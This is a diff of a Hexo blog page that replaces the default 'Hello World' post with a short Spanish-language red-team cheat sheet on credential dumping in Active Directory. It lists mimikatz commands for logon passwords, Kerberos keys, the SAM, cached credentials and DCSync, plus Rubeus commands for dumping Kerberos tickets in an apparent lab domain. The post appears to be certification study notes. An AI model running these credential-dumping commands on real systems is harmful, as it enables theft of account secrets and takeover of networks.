@@ -17,42 +17,8 @@
     content="lai">
   <link 
     rel="icon" 
-    href="/">
-  <title>Hello World</title>
-  
-    
-      <meta 
-        property="og:title" 
-        content="Hello World">
-    
-    
-      <meta 
-        property="og:url" 
-        content="http://l4isec.github.io/2023/01/07/hello-world/index.html">
-    
-    
-      <meta 
-        property="og:img" 
-        content="https://img.songhn.com/img/Y67gdd.png">
-    
-    
-    
-      <meta 
-        property="og:type" 
-        content="article">
-      <meta 
-        property="og:article:published_time" 
-        content="2023-01-07">
-      <meta 
-        property="og:article:modified_time" 
-        content="2023-01-07">
-      <meta 
-        property="og:article:author" 
-        content="theme-kaze">
-      
-        
-      
-    
+    href="https://cdn.discordapp.com/attachments/1013203875047682171/1061251091859243098/image.png">
+  <title>Dumpeo de Credenciales</title>
   
   
   <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
@@ -172,7 +138,14 @@
   <div class="navbar-logo">
     <a class="navbar-logo-main" href="/">
       
-      <span class="navbar-logo-dsc">Theme Kaze</span>
+        <img 
+          class="navbar-logo-img"
+          width="32"
+          height="32"
+          src="https://cdn.discordapp.com/attachments/1013203875047682171/1061251091859243098/image.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">lai blog</span>
       </a>
   </div>
   <div class="navbar-menu">
@@ -270,25 +243,25 @@
               <div class="card card-author">
                 
   <img 
-    src="https://img.songhn.com/img/Y67gdd.png" 
+    src="https://cdn.discordapp.com/attachments/1013203875047682171/1061257912732889160/logo-modified.png" 
     class="author-img"
     width="88"
     height="88"
     alt="author avatar">
 
-<p class="author-name">theme-kaze</p>
-<p class="author-description">designed by theme-kaze</p>
+<p class="author-name">lai</p>
+<p class="author-description">Cybersec stuent</p>
 <div class="author-message">
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>2</span>
+    <span>3</span>
     <span>Posts</span>
   </a>
   <a 
     class="author-categories-count" 
     href="/categories">
-    <span>1</span>
+    <span>2</span>
     <span>Categories</span>
   </a>
   <a 
@@ -298,6 +271,22 @@
     <span>Tags</span>
   </a>
 </div>
+
+  <div class="author-card-society">
+    
+      <div class="author-card-society-icon">
+        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/lairui-wu/">
+          <i class="iconfont icon-linkedin society-icon"></i>
+        </a>
+      </div>
+    
+      <div class="author-card-society-icon">
+        <a target="_blank" rel="noopener" href="https://github.com/lairui03">
+          <i class="iconfont icon-github society-icon"></i>
+        </a>
+      </div>
+    
+  </div>
 
               </div>
                <div class="sticky-tablet">
@@ -311,7 +300,7 @@
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Dumpeo-de-Credenciales"><span class="toc-text">Dumpeo de Credenciales</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hashes-NTLM"><span class="toc-text">Hashes NTLM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos-Encription-Keys"><span class="toc-text">Kerberos Encription Keys</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Security-Account-Manager"><span class="toc-text">Security Account Manager</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Domain-Cached-Credentials"><span class="toc-text">Domain Cached Credentials</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Extraer-Kerberos-Tickets"><span class="toc-text">Extraer Kerberos Tickets</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DCSync"><span class="toc-text">DCSync</span></a></li></ol>
       </div>
     </article>
   
@@ -329,6 +318,13 @@
       <a href="/categories/Certificacion/">
         <div class="categories-list-item">
           Certificacion
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Tools/">
+        <div class="categories-list-item">
+          Tools
           <span class="categories-list-item-badge">1</span>
         </div>
       </a>
@@ -348,9 +344,9 @@
   <div class="tags-list">
     
       <a 
-        href="/tags/Red-Team/" 
-        title="Red Team">
-        <div class="tags-list-item">Red Team</div>
+        href="/tags/Review/" 
+        title="Review">
+        <div class="tags-list-item">Review</div>
       </a>
     
       <a 
@@ -360,9 +356,9 @@
       </a>
     
       <a 
-        href="/tags/Review/" 
-        title="Review">
-        <div class="tags-list-item">Review</div>
+        href="/tags/Red-Team/" 
+        title="Red Team">
+        <div class="tags-list-item">Red Team</div>
       </a>
     
   </div>
@@ -374,14 +370,23 @@
             </aside>
             <main class="main-column">
               
+  <div class="image-wrapper">
+    <img 
+      src="https://www.alternativesp.com/wp-content/uploads/2021/03/mimikatz-600x600.png" 
+      data-src="https://www.alternativesp.com/wp-content/uploads/2021/03/mimikatz-600x600.png"
+      srcset="data:image/svg+xml,%3Csvg%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20viewBox=&#39;0%200%20300%20300&#39;%3E%3C/svg%3E"
+      class="image lozad"
+      alt="Dumpeo de Credenciales thumbnail">
+  </div>
+
 <article class="card card-content">
   <header>
     <h1 class="post-title">
-      Hello World
+      Dumpeo de Credenciales
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2023-01-07T13:25:40.254Z">
+    <time datetime="2023-01-07T13:43:45.000Z">
       <i 
         class="iconfont icon-calendar" 
         style="margin-right: 2px;">
@@ -389,29 +394,97 @@
       <span>2023-01-07</span>
     </time>
     
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/Tools/" 
+          class="post-meta-link">
+          Tools
+        </a>
+      
+    
     
       <span class="dot"></span>
-      <span>75 words</span>
+      <span>331 words</span>
     
   </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/Active-Directory/" 
+            class="post-meta-link">
+            Active Directory
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/Red-Team/" 
+            class="post-meta-link">
+            Red Team
+          </a>
+        
+      </div>
+    </div>
   
   </header>
   <div 
     id="section" 
     class="post-content">
-    <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="highlight"><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre>
+    <h1 id="Dumpeo-de-Credenciales"><a href="#Dumpeo-de-Credenciales" class="headerlink" title="Dumpeo de Credenciales"></a>Dumpeo de Credenciales</h1><h1 id="Hashes-NTLM"><a href="#Hashes-NTLM" class="headerlink" title="Hashes NTLM"></a>Hashes NTLM</h1><p><strong>sekurlsa::logonpassword</strong> es famoso por dumpear las contraseñas en texto claro de la memoria. Con los hashes NTLM podemos realizar un <strong>Pass The Hash</strong>  o simplemente podemos crackear y conseguir una contraseña en texto claro.</p>
+<pre class="highlight"><span class="line">mimikatz.exe sekurlsa::logonpasswords</span><br></pre>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="highlight"><span class="line">$ hexo server</span><br></pre>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="highlight"><span class="line">$ hexo generate</span><br></pre>
+<h1 id="Kerberos-Encription-Keys"><a href="#Kerberos-Encription-Keys" class="headerlink" title="Kerberos Encription Keys"></a>Kerberos Encription Keys</h1><p><strong>sekurlsa::ekeys</strong> nos permite poder dumpear las keys de encription de kerberos de todo los usuarios que estan actualmente logueados. </p>
+<pre class="highlight"><span class="line">mimikatz.exe sekurlsa::ekeys</span><br></pre>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="highlight"><span class="line">$ hexo deploy</span><br></pre>
+<p>En este caso el hash AES256 es la que tenemos que guardar.</p>
+<h1 id="Security-Account-Manager"><a href="#Security-Account-Manager" class="headerlink" title="Security Account Manager"></a>Security Account Manager</h1><p>O mejor conocido como la SAM es una base de datos donde va estar alojado todos los hashes NTLM de las cuentas locales podemos dumpearlo con <strong>lsadump::sam</strong>.</p>
+<pre class="highlight"><span class="line">mimikatz.exe lsadump::sam</span><br></pre>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<h1 id="Domain-Cached-Credentials"><a href="#Domain-Cached-Credentials" class="headerlink" title="Domain Cached Credentials"></a>Domain Cached Credentials</h1><p>O mejor también conocidas como DCC, son hashes NTLM que no se pueden usar como para el <strong>Pass The Hash</strong>, la única forma de aprovechar esto es crackearlo en offline. <em><strong>lsadump::cache</strong></em> , también puede ser extraidos del <code>HKLM\SECURITY</code></p>
+<pre class="highlight"><span class="line">mimikatz.exe lsadump::cache</span><br></pre>
+
+<h1 id="Extraer-Kerberos-Tickets"><a href="#Extraer-Kerberos-Tickets" class="headerlink" title="Extraer Kerberos Tickets"></a>Extraer Kerberos Tickets</h1><p>Podemos ultilizar <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a> para llevar acabo esto, con el comando <strong>triage</strong> esto requiere de unos privilegios altos, lo que hace este comando es listar todo los tickets en la sesión que estamos logueada.</p>
+<pre class="highlight"><span class="line">rubeus.exe triage</span><br></pre>
+
+<p>El output de esto nos lo va mostrar como algo así </p>
+<table>
+<thead>
+<tr>
+<th>LUID</th>
+<th>UserName</th>
+<th>Service</th>
+<th>EndTime</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x7049f</td>
+<td>jking @ web.NCORP.IO</td>
+<td>krbtgt&#x2F;dev.NCORP.IO</td>
+<td>9&#x2F;1&#x2F;2022 5:29:20 PM</td>
+</tr>
+</tbody></table>
+<p>Una vez que tengamos listado los tickets en este caso nos interesa el de jking, podemos extraerlo con <strong>dump</strong> lo que nos va extraer es el TGT.</p>
+<pre class="highlight"><span class="line">rubeus.exe dump /luid:<span class="number">0</span>x7049f /service:krbtgt /nowrap</span><br></pre>
+
+<h1 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h1><p>El <strong>DCSync</strong> se aprovecha del protocolo Directory Replication Service para extraer usernames y credenciales del DC.</p>
+<div class="post-note note-info"><p>Esto requiere de unos privilegios de GetNCChanges que acutalmente solo estará disponible para los Domain Admins.</p></div>
+
+
+<p>Para hacer dcsync podemos usar directamente el comando que viene en el Cobalt Strike o <strong>lsadump::dcsync</strong>.</p>
+<pre class="highlight"><span class="line">mimikatz.exe lsadump::dcsync /domain:dev.ncorp.io /user:DEV\Krbtgt</span><br></pre>
+
 
   </div>
   <div>
@@ -424,15 +497,15 @@
             target="_blank" 
             rel="nofollow noopener noreferrer" 
             href="/about">
-            theme-kaze
+            lai
           </a>
         </p>
         <p>
           <span style="font-weight: bold;">文章链接：</span><a 
             target="_blank" 
             rel="nofollow noopener noreferrer" 
-            href="http://l4isec.github.io/2023/01/07/hello-world/">
-            http://l4isec.github.io/2023/01/07/hello-world/
+            href="http://l4isec.github.io/2023/01/07/Dumpeo-de-Credenciales/">
+            http://l4isec.github.io/2023/01/07/Dumpeo-de-Credenciales/
           </a>
         </p>
         <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
@@ -442,20 +515,20 @@
 </article>
 <div class="nav">
   
-    <div class="nav-item-prev">
+  
+    <div class="nav-item-next">
       <a 
-        href="/2023/01/07/CRTP-Review/" 
+        href="/2023/01/07/CRTO-Review/" 
         class="nav-link">
-        <i class="iconfont icon-left nav-prev-icon"></i>
         <div>
-          <div class="nav-label">Prev</div>
+          <div class="nav-label">Next</div>
           
-            <div class="nav-title">Certified Red Team Professional (CRTP) Review </div>
+            <div class="nav-title">Certified Red Team Operator (CRTO) Review </div>
           
         </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
       </a>
     </div>
-  
   
 </div>
 
@@ -468,7 +541,7 @@
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Dumpeo-de-Credenciales"><span class="toc-text">Dumpeo de Credenciales</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hashes-NTLM"><span class="toc-text">Hashes NTLM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos-Encription-Keys"><span class="toc-text">Kerberos Encription Keys</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Security-Account-Manager"><span class="toc-text">Security Account Manager</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Domain-Cached-Credentials"><span class="toc-text">Domain Cached Credentials</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Extraer-Kerberos-Tickets"><span class="toc-text">Extraer Kerberos Tickets</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DCSync"><span class="toc-text">DCSync</span></a></li></ol>
 </div>
             </main>
             <aside class="right-column">
@@ -482,7 +555,7 @@
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Dumpeo-de-Credenciales"><span class="toc-text">Dumpeo de Credenciales</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hashes-NTLM"><span class="toc-text">Hashes NTLM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos-Encription-Keys"><span class="toc-text">Kerberos Encription Keys</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Security-Account-Manager"><span class="toc-text">Security Account Manager</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Domain-Cached-Credentials"><span class="toc-text">Domain Cached Credentials</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Extraer-Kerberos-Tickets"><span class="toc-text">Extraer Kerberos Tickets</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DCSync"><span class="toc-text">DCSync</span></a></li></ol>
     </article>
   
   
@@ -498,12 +571,17 @@
     
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2023-01-07</div>
-        <a href="/2023/01/07/CRTP-Review/"><div class="recent-posts-item-content">Certified Red Team Professional (CRTP) Review</div></a>
+        <a href="/2023/01/07/Dumpeo-de-Credenciales/"><div class="recent-posts-item-content">Dumpeo de Credenciales</div></a>
       </div>
     
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2023-01-07</div>
-        <a href="/2023/01/07/hello-world/"><div class="recent-posts-item-content">Hello World</div></a>
+        <a href="/2023/01/07/CRTO-Review/"><div class="recent-posts-item-content">Certified Red Team Operator (CRTO) Review</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2023-01-07</div>
+        <a href="/2023/01/07/CRTP-Review/"><div class="recent-posts-item-content">Certified Red Team Professional (CRTP) Review</div></a>
       </div>
     
   </div>
@@ -525,51 +603,35 @@
         <span>
           Copyright ©
           
-            2020
+            2023
           
-          
-                - 
-                2023
           
         </span>
         &nbsp;
         <a 
           href="/" 
           class="footer-link">
-          Theme Kaze
+          lai blog
         </a>
       </div>
     </div>
 
     
+    
+    
+    
       <div class="footer-dsc">
         
-          Powered by
-          <a 
-            href="https://hexo.io/" 
-            class="footer-link" 
-            target="_blank" 
-            rel="nofollow noopener noreferrer">
-            &nbsp;Hexo
-          </a>
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
         
         
           <span>&nbsp;|&nbsp;</span>
         
         
-          Theme -
-          <a 
-            href="https://github.com/theme-kaze" 
-            class="footer-link" 
-            target="_blank"
-            rel="nofollow noopener noreferrer">
-            &nbsp;Kaze
-          </a>
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
         
       </div>
-    
-    
-    
+      
     
 </footer>
  
@@ -645,6 +707,10 @@
      
      
     <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
      
     
       <script>
@@ -667,6 +733,10 @@
     <script src="//instant.page/5.1.0" type="module"
       integrity="sha384-by67kQnR+pyfy8yWP4kPO12fHKRLHZPfEsiSXR8u2IKcTdxD805MGUXBzVPnkLHw"></script>
     
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
     
   </body>
 </html>
